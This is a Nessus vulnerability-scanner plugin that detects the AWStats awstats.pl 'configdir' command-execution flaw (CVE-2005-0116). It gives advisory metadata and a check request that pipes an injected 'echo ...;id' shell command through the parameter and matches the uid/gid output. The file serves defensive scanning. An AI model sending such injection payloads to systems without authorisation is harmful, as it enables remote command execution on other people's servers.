#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(16189);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2017/04/27 19:46:26 $");

 script_cve_id("CVE-2005-0116");
 script_bugtraq_id(12270, 12298);
 script_osvdb_id(13002);

 script_name(english:"AWStats awstats.pl configdir Parameter Arbitrary Command Execution");
 script_summary(english:"Determines the presence of AWStats awstats.pl flaws");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows execution of
arbitrary commands.");
 script_set_attribute(attribute:"description", value:
"The remote host is running AWStats, a free logfile analysis tool for
analyzing ftp, mail, web, ...  traffic. 

The remote version of this software fails to sanitize user-supplied
input to the 'configdir' parameter of the 'awstats.pl' script.  An
attacker may exploit this condition to execute commands remotely or
disclose contents of files, subject to the privileges under which the
web server operates.");
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=185
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2210a10f");
 script_set_attribute(attribute:"see_also", value:"http://www.awstats.org/docs/awstats_changelog.txt");
 script_set_attribute(attribute:"solution", value:"Upgrade to AWStats version 6.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'AWStats configdir Remote Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_cwe_id(20);

 script_set_attribute(attribute:"vuln_publication_date", value:"2005/01/01");
 script_set_attribute(attribute:"plugin_publication_date", value:"2005/01/18");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:laurent_destailleur:awstats");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 
 script_dependencies("awstats_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 script_require_keys("www/AWStats");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0, "Port "+port+" is closed");
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0, "The web server on port "+port+" is embedded.");

# Test an install.
install = get_kb_item(string("www/", port, "/AWStats"));
if (isnull(install)) exit(0, "AWStats was not detected on port "+port);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{ 
  dir = matches[2];
  http_check_remote_code (
			extra_dirs:make_list(dir),
			extra_check:"Check config file, permissions and AWStats documentation",
			check_request:"/awstats.pl?configdir=|echo%20Content-Type:%20text/html;%20echo%20;id|%00",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id" );
}
